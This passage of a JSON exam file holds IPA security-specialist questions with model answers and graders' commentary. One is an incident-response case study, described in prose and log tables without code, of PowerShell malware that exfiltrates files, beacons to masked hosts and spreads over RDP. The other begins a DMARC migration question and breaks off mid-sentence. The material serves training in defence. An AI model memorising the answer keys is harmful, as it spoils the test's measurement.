@@ -1,0 +1,400 @@
+{
+ "id": "r06a_sc_pm",
+ "title": "令和6年度 秋期 情報処理安全確保支援士 午後",
+ "source": "IPA 情報処理安全確保支援士試験 問題冊子・解答例・採点講評（令和6年度秋期 午後）",
+ "questions": [
+  {
+   "no": 1,
+   "title": "インシデントレスポンス",
+   "pages": "p.2〜11",
+   "aim": "サイバー攻撃はエンドポイントへの侵入から始まることが多い。攻撃者は，マルウェアを仕掛けた後に，より高い権限の奪取を試みたり，ほかのエンドポイントを探索したりする。そのため，エンドポイントのセキュリティ対策としてログの分析が重要になってきている。インシデント発生時に迅速に対応するためには，どのような攻撃を受けているのかをログから推測・確認する対応力が必要となる。本問では，ソフトウェア開発会社の社内システムの運用及びインシデント対応を題材として，ログを解析する能力及び技術的対策を立案する能力を問う。",
+   "body": "\n<p>L 社は，従業員 100 名のソフトウェア開発会社である。L 社の社内システムは，情報システム部（以下，情シス部という）が，運用及びインシデント対応を行っている。</p>\n<p>L 社は，E 社の SaaS を使用している。L 社のネットワーク構成を図 1 に，図 1 の各構成要素の仕様，機能及び利用方法を表 1 に示す。</p>\n<div class=\"fig\"><img src=\"data/img/r06a_pm1_fig1.png\" alt=\"E社SaaS（プロキシサービス、マルウェア対策サービス、メールサービス、DNSサービス）とインターネット、L社（オフィスLAN：AP・L2SW・シンクライアントPC、仮想環境LAN：L2SW・仮想環境の仮想スイッチと仮想PC、FW、L3SW、サーバLAN：L2SW・ドメインサーバ・ファイルサーバ、サポートLAN：バックアップサーバ・L2SW・保守用PC）の構成図\" loading=\"lazy\"><p class=\"fig-caption\">図1　L 社のネットワーク構成（抜粋）</p></div>\n<p class=\"fig-note\">FW：ファイアウォール　L2SW：レイヤー2 スイッチ　L3SW：レイヤー3 スイッチ　AP：無線 LAN アクセスポイント<br>仮想環境：物理サーバ上で仮想スイッチと複数の仮想 PC を稼働させる環境</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>構成要素</th><th>仕様，機能及び利用方法</th></tr></thead><tbody><tr><td>ドメインサーバ</td><td>・ドメイン名 ad01 という L 社の社内ドメインを管理する。<br>・L 社の各従業員には一つのドメインユーザーが割り当てられている。<br>・ドメインユーザーが登録されており，プロキシサービス，メールサービス，L 社内のサーバ，仮想 PC 及び保守用 PC（以下，L 社内のサーバ，仮想 PC 及び保守用 PC を L 社内ホストという）にログオンする際の利用者認証に利用される。<br>・ログオンは，ドメインユーザーの利用者 ID とパスワードで行う。</td></tr><tr><td>プロキシサービス</td><td>・専用のプログラム（以下，Q プログラム<sup>注1)</sup>という）を L 社内ホストにインストールする必要がある。Q プログラムがドメインサーバに接続され，ドメインユーザーが認証されると，利用可能になる。<br>・Q プログラムがインストールされた L 社内ホストからインターネットへの HTTP 通信及び HTTPS 通信を全て中継する。<br>・HTTPS 通信を復号して URL フィルタリング機能を適用し，再暗号化することができる。<br>・URL フィルタリング機能では，ドメインユーザーごとに指定された URL へのアクセスを許可又は拒否することができる。<br>　- 次の 3 種類のリストがあり，上から順に URL フィルタリングが適用される。<br>　・管理者許可リスト：管理者が設定できる。アクセスが許可される URL のリストである。“全て”と記載すると，全ての URL へのアクセスが許可される。何も設定しないとリストは無視される。<br>　・管理者拒否リスト：管理者が設定できる。アクセスが拒否される URL のリストである。“全て”と記載すると，全ての URL へのアクセスが拒否される。何も設定しないとリストは無視される。設定された URL へのアクセスが拒否されたときは，情シス部にアラートメールが送付されるように設定している。<br>　・ベンダー拒否リスト：E 社から日次で提供される。アクセスが拒否される URL のリストであり，マルウェア感染などのカテゴリがある。アクセスが拒否された URL がマルウェア感染のカテゴリに一致したときは，情シス部にアラートメールが送付されるように設定している。<br>　- どのリストにも該当しない場合は，アクセスは許可される。<br>・管理用の Web ページから，各種設定の変更と通信ログの確認ができる。</td></tr><tr><td>マルウェア対策サービス</td><td>・L 社内ホストに導入しているマルウェア対策ソフトを管理する。<br>・管理用の Web ページから，各種設定の変更，マルウェア定義ファイルの適用状況の確認，マルウェア対策ソフトの稼働状況の確認及びマルウェア検知のログの確認ができる。<br>・マルウェアが検知されたときは，情シス部にアラートメールが送付される。</td></tr><tr><td>仮想 PC</td><td>・L 社の従業員には，一人 1 台割り当てられている。<br>・従業員がシンクライアント PC から RDP で接続して利用する。<br>・従業員が利用するアカウントは，ドメインユーザーであり，仮想 PC 上のローカルアドミニストレーター権限をもっている。<br>・各ドメインユーザーは，割り当てられた仮想 PC にだけログオンできる。<br>・ホスト名は PC-x<sup>注2)</sup>である。<br>・マルウェア感染が確認された場合，情シス部が仮想環境の仮想スイッチから切り離し，感染拡大を防ぐ。</td></tr><tr><td>ファイルサーバ</td><td>・L 社の顧客情報，設計書など，社外秘に指定されている情報（以下，社外秘情報 L という）を保管する。<br>・社外秘情報 L は，仮想 PC には保管せず，ファイルサーバに保管するルールにしている。<br>・利用時はドメインサーバでの認証が必要である。<br>・ホスト名は filesv である。</td></tr><tr><td>保守用 PC</td><td>・L 社内のサーバと仮想 PC を保守するための専用の PC である。インシデント発生時は本 PC で調査を行う。<br>・保守用ツールのほか，ネットワークトラフィック調査及びフォレンジック用のツールがインストールされている。</td></tr></tbody></table></div><p class=\"fig-caption\">表1　図 1 の各構成要素の仕様，機能及び利用方法（抜粋）</p></div>\n<p class=\"fig-note\">注1)　HTTP 及び HTTPS 通信をプロキシサービスに送り，そのログを取得する機能をもつ。<br>注2)　x には，英大文字が 1 字以上入る。</p>\n<h3>〔ツールの開発〕</h3>\n<p>情シス部の X 主任と Y さんは，インシデント対応時にログの調査に手間どらないように，証拠データを収集するツール（以下，F ツールという）を開発することにした。F ツールの概要を図 2 に示す。</p>\n<div class=\"fig\"><div class=\"fig-box\">■機能<br>・インシデント対応時に 1 台の仮想 PC 上で，インシデント対応に必要なログ，レジストリなどの証拠データを収集元から収集し，表 2 に示す出力ファイルを出力する。<br>・証拠データの収集元及び保存先並びに出力ファイルの出力先は，設定ファイルで指定する。<br>■使い方<br>・仮想 PC が稼働しているときは，仮想 PC 上で実行する。<br>・仮想 PC が稼働していないときは，保守用 PC に仮想 PC のディスクイメージをコピーしてマウントし，保守用 PC 上で実行する。</div><p class=\"fig-caption\">図2　F ツールの概要（抜粋）</p></div>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>ファイル名</th><th>記載される内容</th></tr></thead><tbody><tr><td>file.csv</td><td>ファイルの生成，参照，更新，削除及び実行のログ</td></tr><tr><td>srv.csv</td><td>サービス及びタスク<sup>注1)</sup>の登録，削除，開始及び停止のログ</td></tr><tr><td>auth.csv</td><td>認証<sup>注2)</sup>の成功と失敗，アカウントの作成，特権の利用，イベントログの消去などのログ</td></tr><tr><td>net1.csv</td><td>Q プログラムのログ</td></tr><tr><td>net2.csv</td><td>プロセスごとの 1 時間のネットワーク送受信量の記録</td></tr><tr><td>time.csv</td><td>file.csv，srv.csv，auth.csv，net1.csv を結合して時刻順に並べ替えたもの</td></tr></tbody></table></div><p class=\"fig-caption\">表2　F ツールの出力ファイル</p></div>\n<p class=\"fig-note\">注1)　決められたスケジュール及び指定したイベントをトリガーに実行されるプログラム<br>注2)　対話型，ネットワーク，サービス，RDP など，ログオンの種類も記録される。</p>\n<h3>〔インシデント発生時の F ツール活用〕</h3>\n<p>12 月 6 日，情シス部の Y さんは，プロキシサービスからアラートメールを受信した。Y さんが，アラートメールを確認したところ，PC-A が，https://○○○.com/にアクセスしようとしてアクセスが拒否されたこと及びその URL がベンダー拒否リストのマルウェア感染のカテゴリに一致したことが分かり，上司の X 主任に報告した。</p>\n<p>PC-A が割り当てられている従業員に連絡した上で，X 主任は，PC-A を一旦，仮想スイッチから切り離して F ツールを実行し，F ツールの出力ファイルとプロキシサービスの通信ログから，https://○○○.com/にアクセスした原因を調査するように Y さんに指示した。</p>\n<p>PC-A での F ツールの出力ファイルのうち，time.csv を表 3 に，net2.csv を表 4 に，プロキシサービスの通信ログのうち送信元が PC-A であるものを表 5 に示す。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>日時</th><th>事象</th><th>ファイル名</th></tr></thead><tbody><tr><td>12/04 22:12:28</td><td>https://○○search.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/04 22:20:34</td><td>https://△△△.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/04 22:32:48</td><td>i.ps1 が作成された。</td><td>file.csv</td></tr><tr><td>12/04 22:33:12</td><td>i.ps1 が PowerShell で実行された。</td><td>file.csv</td></tr><tr><td>12/04 22:33:21</td><td>“タスク名：install”が登録された。</td><td>srv.csv</td></tr><tr><td>12/04 22:33:22</td><td>“タスク名：install”が実行された。</td><td>srv.csv</td></tr><tr><td>12/04 22:33:25</td><td>https://△△△.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/04 22:34:28</td><td>VSCAN_SVC<sup>注1)</sup>が停止された。</td><td>srv.csv</td></tr><tr><td>12/04 22:38:12</td><td>D ドライブのファイルが参照された。</td><td>file.csv</td></tr><tr><td>（省略）<sup>注2)</sup></td><td></td><td></td></tr><tr><td>12/04 22:42:06</td><td>\\\\filesv のファイルが参照された。</td><td>file.csv</td></tr><tr><td>（省略）<sup>注3)</sup></td><td></td><td></td></tr><tr><td>12/04 22:59:07</td><td>s.rar が作成された。</td><td>file.csv</td></tr><tr><td>12/04 23:00:05</td><td>https://△△△.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/04 23:10:05</td><td>s.rar が削除された。</td><td>file.csv</td></tr><tr><td>12/04 23:31:15</td><td>PC-A からドメインサーバに，ad01\\user019 で RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:32:05</td><td>PC-A から PC-B に，ad01\\user019 で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:32:16</td><td>PC-A から PC-B に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:32:22</td><td>PC-A から PC-B に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:32:35</td><td>PC-A から PC-C に，ad01\\user019 で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:32:51</td><td>PC-A から PC-C に，.\\administrator で，RDP 接続が許可された。</td><td>auth.csv</td></tr><tr><td>12/04 23:35:01</td><td>PC-A から PC-D に，ad01\\user019 で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:35:17</td><td>PC-A から PC-D に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:35:21</td><td>PC-A から PC-D に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:35:36</td><td>PC-A から PC-E に，ad01\\user019 で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:35:45</td><td>PC-A から PC-E に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:35:52</td><td>PC-A から PC-E に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:36:02</td><td>PC-A から PC-F に，ad01\\user019 で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:36:15</td><td>PC-A から PC-F に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:36:24</td><td>PC-A から PC-F に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:37:35</td><td>PC-A から PC-G に，ad01\\user019 で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:37:49</td><td>PC-A から PC-G に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>12/04 23:37:54</td><td>PC-A から PC-G に，.\\administrator で，RDP 接続が失敗した。</td><td>auth.csv</td></tr><tr><td>（省略）<sup>注4)</sup></td><td></td><td></td></tr><tr><td>12/05 22:34:05</td><td>https://○○○.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/05 23:34:05</td><td>https://○○○.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 00:34:05</td><td>https://○○○.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 01:34:04</td><td>https://○○○.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 02:34:03</td><td>https://○○○.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 02:34:04</td><td>https://○○○.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 02:34:05</td><td>https://□□□.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 03:34:05</td><td>https://□□□.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 04:34:05</td><td>https://□□□.com/に接続を試みた。</td><td>net1.csv</td></tr><tr><td>12/06 05:34:04</td><td>https://□□□.com/に接続を試みた。</td><td>net1.csv</td></tr></tbody></table></div><p class=\"fig-caption\">表3　PC-A の time.csv（抜粋）</p></div>\n<p class=\"fig-note\">注記1　アカウント名の表記は domainhost\\userNNN としている。domainhost にはドメイン名又はホスト名が，userNNN には利用者 ID がそれぞれ入る。ただし，domainhost が“.”の場合は，userNNN は仮想 PC のローカルユーザーであることを示す。<br>注記2　12/04 22:33:25 から 12/05 22:34:05 の間に発生した https://○○○.com/への接続試行ログは省略している。<br>注1)　マルウェア対策ソフトのサービス名である。<br>注2)　D ドライブのファイルの参照ログだけである。<br>注3)　\\\\filesv のファイルの参照ログだけである。<br>注4)　RDP 接続の失敗ログだけである。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>日時</th><th>プロセス</th><th>ネットワーク送受信量（M バイト）</th></tr></thead><tbody><tr><td>12/04 23:05:40</td><td>Web ブラウザ</td><td>4.5</td></tr><tr><td>12/04 23:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>810.0</td></tr><tr><td>12/05 00:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>196.0</td></tr><tr><td>（省略）<sup>注1)</sup></td><td></td><td></td></tr><tr><td>12/06 00:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>0.1</td></tr><tr><td>12/06 01:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>0.1</td></tr><tr><td>12/06 02:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>0.1</td></tr><tr><td>12/06 03:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>0.1</td></tr><tr><td>12/06 04:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>0.1</td></tr><tr><td>12/06 05:05:40</td><td>C:\\（省略）\\powershell.exe</td><td>0.1</td></tr></tbody></table></div><p class=\"fig-caption\">表4　PC-A の net2.csv（抜粋）</p></div>\n<p class=\"fig-note\">注記　プロセスごとの，毎時 5 分 40 秒までの 1 時間のネットワーク送受信量の記録である。<br>注1)　C:\\（省略）\\powershell.exe のネットワーク送受信量の行だけである。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>日時</th><th>利用者 ID</th><th>宛先</th><th>宛先ポート番号</th><th>フィルタアクション</th><th>送受信量（M バイト）</th></tr></thead><tbody><tr><td>12/04 22:12:28</td><td>ad01\\user019</td><td>https://○○search.com/</td><td>443</td><td>許可</td><td>1.0</td></tr><tr><td>12/04 22:20:34</td><td>ad01\\user019</td><td>https://△△△.com/i.ps1</td><td>443</td><td>許可</td><td>2.0</td></tr><tr><td>12/04 22:33:25</td><td>ad01\\user019</td><td>https://△△△.com/v/q.ps1</td><td>443</td><td>許可</td><td>4.0</td></tr><tr><td>12/04 23:00:05</td><td>ad01\\user019</td><td>https://△△△.com/v/upl</td><td>443</td><td>許可</td><td>511.0</td></tr><tr><td>12/04 23:34:02</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>（省略）<sup>注1)</sup></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>12/05 22:34:05</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/05 23:34:05</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/06 00:34:05</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/06 01:34:04</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/06 02:34:03</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>拒否</td><td>－</td></tr><tr><td>12/06 02:34:04</td><td>ad01\\user019</td><td>https://○○○.com/</td><td>443</td><td>拒否</td><td>－</td></tr><tr><td>12/06 02:34:05</td><td>ad01\\user019</td><td>https://□□□.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/06 03:34:05</td><td>ad01\\user019</td><td>https://□□□.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/06 04:34:05</td><td>ad01\\user019</td><td>https://□□□.com/</td><td>443</td><td>許可</td><td>0.1</td></tr><tr><td>12/06 05:34:04</td><td>ad01\\user019</td><td>https://□□□.com/</td><td>443</td><td>許可</td><td>0.1</td></tr></tbody></table></div><p class=\"fig-caption\">表5　プロキシサービスの通信ログのうち送信元が PC-A であるもの（抜粋）</p></div>\n<p class=\"fig-note\">注1)　一つ前のログと同じ https://○○○.com/への許可された通信のログだけである。</p>\n<h3>〔暫定対策と追加調査の実施〕</h3>\n<p>X 主任と Y さんは，PC-A がマルウェアに感染し，PC-A 及び <span class=\"blank\">a</span> 上のファイルのほか，<span class=\"blank\">b</span> 上のファイルのうち，アカウント <span class=\"blank\">c</span> でアクセス可能なファイルがインターネットに送信されているおそれがあると考え，図 3 の暫定対策と追加調査を行った。</p>\n<div class=\"fig\"><div class=\"fig-box\">暫定対策<br>1　マルウェア感染拡大とこれ以上のファイルの送信を防ぐために，ドメインサーバでアカウント <span class=\"blank\">c</span> の <span class=\"blank\">d</span> を行う。<br>2　ファイルの送信を防ぐために，<u>①プロキシサービスで対策を行う</u>。<br>追加調査<br>1　表 3 から，PC-A から <span class=\"blank\">a</span> にマルウェア感染が拡大している可能性があると考えられるので，<span class=\"blank\">a</span> について PC-A と同様の調査を行う。<br>2　プロキシサービスのログで，PC-A，<span class=\"blank\">a</span> のほかに<u>②マルウェアに感染している L 社内ホストがないか調査を行う</u>。</div><p class=\"fig-caption\">図3　暫定対策と追加調査</p></div>\n<p>また，X 主任は PC-A の証拠データと，PC-A の調査で収集できた i.ps1 をセキュリティ専門会社である C 社に提供し，解析を依頼した。C 社の解析結果を図 4 に示す。</p>\n<div class=\"fig\"><div class=\"fig-box\">i.ps1 の動作<br>(a) タスクを登録する。登録するタスクの設定は次のとおりである。既に同じタスク名のタスクが登録されている場合は何もしない。<br>　タスク名：install<br>　実行時に使うアカウント：タスク登録時に，ログオンしているアカウント<br>　登録するスクリプトの動作：https://△△△.com/v/q.ps1 をメモリ上に展開し，実行する。<br>　タスク実行のトリガー：ログオン時に実行される。<br>(b) タスクを登録した後に，(a)で登録したタスクを実行する。<br><br>q.ps1 の動作<br>解析に用いたファイルは，当社が 12 月 6 日 15 時に，https://△△△.com/v/q.ps1 からダウンロードしたものである。次は，当社が入手した脅威情報を加味したものである。<br>(c) マルウェア対策ソフトを停止する。<br>(d) 特定のディスク領域とネットワークドライブのファイルを RAR 形式でアーカイブファイルにまとめ，https://△△△.com/v/upl を使ってアップロードする。<br>(e) 1 時間おきに https://○○○.com/にコネクトバック通信をする。<br>(f) (e)の通信ができない場合，リトライ通信を 1 回行う。リトライ通信に失敗した場合は，https://□□□.com/にコネクトバック通信をし，以降は，1 時間おきに https://□□□.com/にコネクトバック通信をする。<br>(g) パスワード又はパスワードハッシュを PC のメモリ上から窃取する。<br>(h) ping コマンドを使ってホストを探索し，RDP 接続を試みる。RDP 接続に失敗した場合，何もしない。<br>(i) RDP 接続に成功すると，接続先で i.ps1 の実行を試みる。</div><p class=\"fig-caption\">図4　C 社の解析結果（概要）</p></div>\n<p>Y さんは図 4 の解析結果から，図 3 の追加調査の 1 及び 2 では，図 4 で解析したマルウェアが，今後，活動する可能性がある L 社内ホストを見逃したおそれがあると考えた。Y さんは<u>③追加調査の 3 として，L 社内ホストの全てに対して新たな調査を行う</u>必要があるのではないかと X 主任に相談した。X 主任は同意し，調査には時間が掛かるので，調査と並行して，<u>④図 4 のマルウェアの活動を自動的に検出する新たな仕組み</u>を作るように指示した。</p>\n<p>この追加調査の 3 では，<span class=\"blank\">a</span> だけがマルウェアに感染した可能性があることが判明し，必要な対処を行った。また，新たにマルウェアの活動は検出されなかったので，復旧に向け対応を進めることにした。</p>\n<h3>〔技術的対策の立案〕</h3>\n<p>X 主任と Y さんは，今回と同様のマルウェア感染が起きた場合に備えて，図 3 の暫定対策以外に，攻撃者による目的実行までの活動を阻止するための技術的対策を，表 6 のとおりにまとめた。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>今回の攻撃者による活動</th><th>技術的対策</th></tr></thead><tbody><tr><td>i.ps1 と q.ps1 を PC-A で実行させた。</td><td>PowerShell の実行ポリシーを設定し，署名のないスクリプトの実行を禁止する。</td></tr><tr><td>PC-A からマルウェア感染を広げた。</td><td><span class=\"blank\">e</span>。</td></tr><tr><td>q.ps1 がファイルを不正に持ち出した。</td><td><span class=\"blank\">f</span>。</td></tr></tbody></table></div><p class=\"fig-caption\">表6　攻撃者による目的実行までの活動を阻止するための技術的対策</p></div>\n<p>今後，表 6 中の技術的対策について，X 主任と Y さんが中心となって導入の計画立案を進めることにした。</p>\n",
+   "items": [
+    {
+     "id": "1-1",
+     "label": "設問1 (1) a",
+     "prompt": "〔暫定対策と追加調査の実施〕について。本文中及び図 3 中の <span class=\"blank\">a</span> に入れる適切なホスト名を答えよ。",
+     "answers": [
+      "PC-C"
+     ]
+    },
+    {
+     "id": "1-2",
+     "label": "設問1 (2) b",
+     "prompt": "本文中の <span class=\"blank\">b</span> に入れる適切なホスト名を答えよ。",
+     "answers": [
+      "filesv"
+     ]
+    },
+    {
+     "id": "1-3",
+     "label": "設問1 (3) c",
+     "prompt": "本文中及び図 3 中の <span class=\"blank\">c</span> に入れる適切なアカウント名を，表 3 の注記 1 に従って答えよ。",
+     "answers": [
+      "ad01\\user019"
+     ]
+    },
+    {
+     "id": "1-4",
+     "label": "設問1 (4) d",
+     "prompt": "図 3 中の <span class=\"blank\">d</span> に入れる適切な対策を 10 字以内で答えよ。",
+     "answers": [
+      "無効化"
+     ]
+    },
+    {
+     "id": "1-5",
+     "label": "設問1 (5)",
+     "prompt": "図 3 中の下線①について，対策の内容を，具体的に答えよ。",
+     "answers": [
+      "全てのドメインユーザーに対して，https://△△△.com/，https://□□□.com/及び https://○○○.com/を管理者拒否リストに登録する。"
+     ]
+    },
+    {
+     "id": "1-6",
+     "label": "設問1 (6)",
+     "prompt": "図 3 中の下線②について，調査の内容を，具体的に答えよ。",
+     "answers": [
+      "https://○○○.com/，https://△△△.com/又は https://□□□.com/に通信した L 社内ホストがないか調査する。"
+     ]
+    },
+    {
+     "id": "1-7",
+     "label": "設問1 (7)",
+     "prompt": "本文中の下線③について，調査の内容を，具体的に答えよ。",
+     "answers": [
+      "タスク名が install であるタスクが登録されている L 社内ホストがないか調査する。"
+     ]
+    },
+    {
+     "id": "1-8a",
+     "label": "設問1 (8) 一つ目",
+     "prompt": "本文中の下線④について，検出する仕組みを，二つ答えよ。",
+     "answers": [
+      "マルウェア対策サービスのログから，マルウェア対策ソフトが停止した L 社内ホストを検出する。"
+     ],
+     "note": "二つは順不同"
+    },
+    {
+     "id": "1-8b",
+     "label": "設問1 (8) 二つ目",
+     "prompt": "本文中の下線④について，検出する仕組みを，二つ答えよ。",
+     "answers": [
+      "ドメインサーバのログから，RDP 接続をくり返している L 社内ホストを検出する。"
+     ],
+     "note": "二つは順不同"
+    },
+    {
+     "id": "2-e",
+     "label": "設問2 e",
+     "prompt": "表 6 中の <span class=\"blank\">e</span>，<span class=\"blank\">f</span> に入れる適切な字句を答えよ。",
+     "answers": [
+      "仮想 PC への RDP 接続に対して，IP アドレスによる接続元制限を行う"
+     ]
+    },
+    {
+     "id": "2-f",
+     "label": "設問2 f",
+     "prompt": "表 6 中の <span class=\"blank\">e</span>，<span class=\"blank\">f</span> に入れる適切な字句を答えよ。",
+     "answers": [
+      "L 社内に DLP を導入し，ファイルの持出しを制限する"
+     ]
+    }
+   ],
+   "commentary": "問１では，ソフトウェア開発会社の社内システムの運用及びインシデントレスポンスを題材に，ログを調査する能力及び技術的対策を立案について出題した。全体として正答率は平均的であった。\n設問１(3)は，正答率が高かった。被害の可能性を複数のログから適切に読み取ることができていた。\n設問１(8)は，正答率が平均的であった。どのログを確認するかの記述がない解答が多かった。マルウェアの動作によって，どのログに何が記録されているかを考え，検知の仕組みを設計できる能力を培ってほしい。\n設問 2ｆは，正答率がやや低かった。ファイルサーバのアクセス権を最小限にするといった解答が散見されたが，マルウェアは，特別な権限なしにファイルを持ち出している。ファイルの持出しに対する技術的対策は複数考えられるが，インシデントで起きたファイルの持出しを防止できる対策を選択してほしい。"
+  },
+  {
+   "no": 2,
+   "title": "ドメイン名変更",
+   "pages": "p.12〜21",
+   "aim": "電子メール（以下，メールという）の送信者メールアドレスを詐称したフィッシングが多くなっている。送信者メールアドレスの正当性を判定する対策として DMARC の導入が進んでいる。本問では，メールのドメイン名の変更を機とした新たなメールサービスの導入を題材として，メールサービスの設定及び DMARC の導入を問う。",
+   "body": "\n<p>A 社は，従業員 1,000 名の工作機械製造会社である。A 社の技術力は高く評価されている。A 社には，総務部，営業部，情報システム部，技術部及び製造部がある。</p>\n<p>A 社の Web サイトでは，一般向けに IR 情報と関連会社へのリンクを，顧客向けに自社製の工作機械管理用アプリケーションプログラムとそのソフトウェア修正プログラムを提供している。また，A 社では，電子メール（以下，メールという）を用いて，顧客との間で見積書や注文書の送受信をしたり，ニュースサイトのメールマガジンに登録して最新の情報を収集したりしている。</p>\n<p>A 社のドメイン名を詐称したメールが毎週 2 通程度，送られていることが，多くの顧客から報告されている。情報システム部長は，顧客に詐欺などの被害が生じるおそれがあることを認識し，メールの詐称対策が必要であると考えている。</p>\n<h3>〔情報システムの現状〕</h3>\n<p>A 社は，10 年前にドメイン名 a-sha.co.jp（以下，A 社ドメイン名という）を取得して以降，A 社の Web サイト（以下，A-Web サイトという）及びメールアドレスのドメイン名として利用している。A 社ドメイン名は，DNS サービス事業者である S 社の権威 DNS サービス（以下，S サービスという）を用いて管理している。</p>\n<p>A-Web サイトは，Web サービス事業者である W 社の Web サービス（以下，W サービスという）を用いて提供している。</p>\n<p>A 社のネットワークを図 1 に，構成要素の機能を表 1 に示す。A 社の従業員は，PC-LAN 内の PC で業務を行っている。</p>\n<div class=\"fig\"><img src=\"data/img/r06a_pm2_fig1.png\" alt=\"インターネットにWサービス、キャッシュDNSサービス、Sサービスが接続。A社はDMZのメールサーバ、ファイアウォール、PC-LAN、サーバLAN（レイヤー2スイッチ、業務サーバ）\" loading=\"lazy\"><p class=\"fig-caption\">図1　A 社のネットワーク（抜粋）</p></div>\n<p class=\"fig-note\">注記　PC-LAN 内の PC の記載は省略している。</p>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>構成要素</th><th>機能</th></tr></thead><tbody><tr><td>メールサーバ</td><td>・S 社が提供するキャッシュ DNS サービスを用いて，DNS 問合せを行う。<br>・インターネットとの間で，SMTP を用いてメールを転送する。<br>・PC-LAN 及び業務サーバから SMTP を用いて送信されるメールを受信する。<br>・宛先メールアドレスのドメイン名が <span class=\"blank\">a</span> であるメールをメールボックスに格納する。<br>・第三者中継防止のためのルールを用いて，第三者中継を防止する。第三者中継防止のためのルールを表 2 に示す。<br>・メールボックス内のメールを，PC-LAN 内の PC が POP3 を用いて受信できるようにする。</td></tr></tbody></table></div><p class=\"fig-caption\">表1　構成要素の機能（抜粋）</p></div>\n<div class=\"fig\"><div class=\"fig-scroll\"><table class=\"fig-table\"><thead><tr><th>項番</th><th>転送元</th><th>宛先メールアドレスのドメイン名</th><th>転送処理</th></tr></thead><tbody><tr><td>1</td><td>インターネット</td><td><span class=\"blank\">a</span></td><td>許可</td></tr><tr><td>2</td><td>PC-LAN</td><td><span class=\"blank\">b</span></td><td>許可</td></tr><tr><td>3</td><td>業務サーバ</td><td>A 社ドメイン名</td><td>許可</td></tr><tr><td>4</td><td>全て</td><td>全て</td><td>拒否</td></tr></tbody></table></div><p class=\"fig-caption\">表2　第三者中継防止のためのルール</p></div>\n<p class=\"fig-note\">注記　項番が小さいルールから順に，最初に一致したルールが適用される。</p>\n<h3>〔ドメイン名の変更についての検討〕</h3>\n<p>A 社は，3 か月後に Z 社への社名変更を予定している。情報システム部長は，メールの詐称対策の導入及び社名変更に合わせたドメイン名変更を検討するように情報システム部の N 主任に指示した。N 主任は情報システム部の E さんと，次のとおり検討した。</p>\n<p>・z-sha.co.jp（以下，Z 社ドメイン名という）が過去に取得されたことがないドメイン名であることを確認してから取得する。<br>\n・Z 社ドメイン名の管理も S サービスで行う。<br>\n・W サービスで Z 社ドメイン名の Web サイト（以下，Z-Web サイトという）も立ち上げる。<br>\n・図 1 のメールサーバでは，複数のドメイン名のメールを受信できないことから，商用のメールサービスに移行する。<br>\n・メールの詐称対策は，SPF，DKIM 及び DMARC で対応する。</p>\n<p>N 主任と E さんは，Z 社が送信するメールの詐称対策（以下，送信対応という）と，Z 